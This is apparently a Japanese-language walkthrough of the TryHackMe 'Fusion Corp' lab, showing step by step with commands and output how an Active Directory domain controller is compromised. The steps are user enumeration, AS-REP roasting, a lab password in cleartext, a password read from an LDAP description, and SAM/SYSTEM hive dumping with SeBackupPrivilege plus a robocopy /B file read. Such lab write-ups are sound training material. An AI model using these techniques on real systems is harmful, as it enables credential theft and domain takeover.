# Fusion Corp CTF

https://tryhackme.com/room/fusioncorp

## Enumeration

```shell
TARGET=10.49.141.125
sudo bash -c "echo $TARGET   fusion.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
80/tcp    open  http             syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
3389/tcp  open  ms-wbt-server    syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
49666/tcp open  unknown          syn-ack ttl 128
49668/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49677/tcp open  unknown          syn-ack ttl 128
49689/tcp open  unknown          syn-ack ttl 128
49696/tcp open  unknown          syn-ack ttl 128
```

```sh
sudo nmap -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49668,49669,49670,49677,49689,49696 $TARGET

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-10 05:02:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
```

### HTTP

/backup を発見。

```sh
dirb http://$TARGET

---- Scanning URL: http://fusion.thm/ ----
==> DIRECTORY: http://fusion.thm/backup/                                                                 
==> DIRECTORY: http://fusion.thm/css/                                                                    
==> DIRECTORY: http://fusion.thm/img/                                                                    
+ http://fusion.thm/index.html (CODE:200|SIZE:53888)                                                     
==> DIRECTORY: http://fusion.thm/js/                                                                     
==> DIRECTORY: http://fusion.thm/lib/
```

OpenDocument のスプレッドシート。

```sh
$ file ./employees.ods 
./employees.ods: OpenDocument Spreadsheet
```

名前とユーザー名の対応が保存されていた。

```txt
Name	Username
Jhon Mickel	jmickel
Andrew Arnold	aarnold
Lellien Linda	llinda
Jhon Powel	jpowel
Dominique Vroslav	dvroslav
Thomas Jeffersonn	tjefferson
Nola Maurin	nmaurin
Mira Ladovic	mladovic
Larry Parker	lparker
Kay Garland	kgarland
Diana Pertersen	dpertersen
```

### SMB, NFS, LDAP

```sh
enum4linux-ng -A $TARGET -oA results.txt

 ============================================================
|    Domain Information via SMB session for 10.49.141.125    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: FUSION-DC                                                                                   
NetBIOS domain name: FUSION                                                                                        
DNS domain: fusion.corp                                                                                            
FQDN: Fusion-DC.fusion.corp                                                                                        
Derived membership: domain member                                                                                  
Derived domain: FUSION
```

無名とguestでは認証不可。

```sh
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u 'guest' -p '' --shares
nxc smb $TARGET -u '' -p '' --rid-brute
```

## kerberos

HTTPで得たユーザーリストのうち、lparker のみ有効だった。

```sh
$ ~/tools/kerbrute userenum --dc fusion.corp -d fusion.corp User.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/10/26 - Ronnie Flathers @ropnop

2026/03/10 14:20:17 >  Using KDC(s):
2026/03/10 14:20:17 >   fusion.corp:88

2026/03/10 14:20:17 >  [+] VALID USERNAME:       lparker@fusion.corp
2026/03/10 14:20:17 >  Done! Tested 11 usernames (1 valid) in 0.332 seconds
```

### AS-REP Roasting

lparker のハッシュを入手。rockyou でクラックできた。

```sh
$ GetNPUsers.py -dc-ip $TARGET fusion.corp/ -usersfile users.txt
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/kali/myenv/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$lparker@FUSION.CORP:08872d75e425e6124fed4d847d4099b0$c98fb7[REDACTED]
[-] invalid principal syntax
```

lparker は、WinRM, RDP, SMB すべてで認証できた。

フラグ発見。

```sh
*Evil-WinRM* PS C:\Users\lparker> tree /A /F
Folder PATH listing
Volume serial number is 82D1-EB4D
C:.
+---Desktop
|       flag.txt
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
```

## 横方向移動

ユーザー一覧を表示したら、jmurphy ユーザーのパスワードが出ていた。

```sh
$ nxc ldap $TARGET -u 'lparker' -p '!!abbylvzsvs2k6!' --users
SMB         10.49.141.125   445    FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False)
LDAP        10.49.141.125   389    FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6! 
LDAP        10.49.141.125   389    FUSION-DC        [*] Enumerated 5 domain users: fusion.corp
LDAP        10.49.141.125   389    FUSION-DC        -Username-                    -Last PW Set-       -BadPW- -Description-
LDAP        10.49.141.125   389    FUSION-DC        Administrator                 2021-03-04 16:13:07 0       Built-in account for administering the computer/domain
LDAP        10.49.141.125   389    FUSION-DC        Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                
LDAP        10.49.141.125   389    FUSION-DC        krbtgt                        2021-03-03 12:43:43 0       Key Distribution Center Service Account                                                                                 
LDAP        10.49.141.125   389    FUSION-DC        lparker                       2021-03-03 13:37:40 0            
LDAP        10.49.141.125   389    FUSION-DC        jmurphy                       2021-03-03 13:41:24 0       Password set to [REDACTED]
```

jmurphy も3種類のプロトコルで認証可能。

フラグ発見。

```sh
*Evil-WinRM* PS C:\Users\jmurphy> tree /A /F
Folder PATH listing
Volume serial number is 82D1-EB4D
C:.
+---Desktop
|       flag.txt
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
```

## 管理者昇格

Backup, Restore 権限を持っている。

```sh
*Evil-WinRM* PS C:\Users\jmurphy> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

認証情報をダンプ

```sh
*Evil-WinRM* PS C:\Users\jmurphy> reg save hklm\sam C:\Users\jmurphy\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\jmurphy> reg save hklm\system C:\Users\jmurphy\system.hive
The operation completed successfully.
```

Administrator のハッシュを取得

```sh
$ secretsdump.py -sam sam.hive -system system.hive LOCAL
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

しかし、WinRM、SMB、RDPいずれも認証できなかった。  
おそらく、DCのためローカルAdministratorのログインが無効にされている？

よく考えたら、Backup権限があるのであればフラグファイルを普通に読めるのではないか？  
しかし、普通に読もうとすると、デスクトップは参照できたがファイルを開けなかった。  

```ps
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:05 AM             37 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
Access to the path 'C:\Users\Administrator\Desktop\flag.txt' is denied.
At line:1 char:1
+ type flag.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\flag.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

通常のファイルアクセスAPIではエラーになるので、robocopy でコピーする。

```ps
*Evil-WinRM* PS C:\Users\Administrator\Desktop> robocopy "C:\Users\Administrator\Desktop" "C:\Users\Public" flag.txt /B
type C:\Users\Public\flag.txt

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, March 9, 2026 11:42:41 PM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\Users\Public\

    Files : flag.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    C:\Users\Administrator\Desktop\
            New File                  37        flag.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        37        37         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :                2642 Bytes/sec.
   Speed :               0.151 MegaBytes/min.
   Ended : Monday, March 9, 2026 11:42:41 PM

THM{[REDACTED]}
```

## 振り返り

- Hard にしてはかなり簡単な部類。
- DC ではAdministratorのハッシュを得てもログイン無効になっている場合があるというのが、今回得た重要な知見。
- バックアップ権限が付いている場合、robocopy を使えば任意のファイルをコピーできる。

## Tags

#tags:Kerberos
